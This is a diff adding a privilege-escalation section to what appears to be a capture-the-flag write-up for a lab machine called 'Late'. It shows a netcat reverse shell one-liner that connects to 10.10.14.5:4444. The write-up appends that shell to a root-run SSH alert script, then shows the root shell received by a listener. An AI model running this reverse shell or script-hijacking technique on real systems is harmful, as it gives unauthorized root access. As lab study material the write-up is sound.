@@ -437,10 +437,52 @@ New path exported: /home/svc_acc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/
 
 no luck with this, but going back to the ssh-alert.sh
                                                                                                                                                
-																	       
-																	       
+Reading it every time we ssh something is sent to root. 												
+
+After hours of attempting to exploit this box with a reverse shell, I found this running netcat.
+
+https://yolospacehacker.com/fr/toolbox.php?id=ncbindnoe
+
+```console
+svc_acc@late:~$ cat ssh-alert.sh 
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f
 
 
+svc_acc@late:~$ 
+```
+
+I added the reverse shell to my home directory since I could not write to the one in sbin. Then running the following commange I can ammend the file to run the one in my directory. 
+
+```console
+svc_acc@late:/usr/local/sbin$ cat /home/svc_acc/ssh-alert.sh >> ssh-alert.sh
+````
+You can check the permissions with running 
+
+```console
+svc_acc@late:/usr/local/sbin$ lsattr ssh-alert.sh
+-----a--------e--- ssh-alert.sh
+```
+
+Then run your NC and in another terminal execute SSH again to run the reverse shell. 
+
+```console 
+
+┌──(p3ta㉿kali)-[~]
+└─$ nc -nlvp 4444              
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.11.156.
+Ncat: Connection from 10.10.11.156:34048.
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# 
+```
+
+																	       
+																	       
+																	       
 
 
 
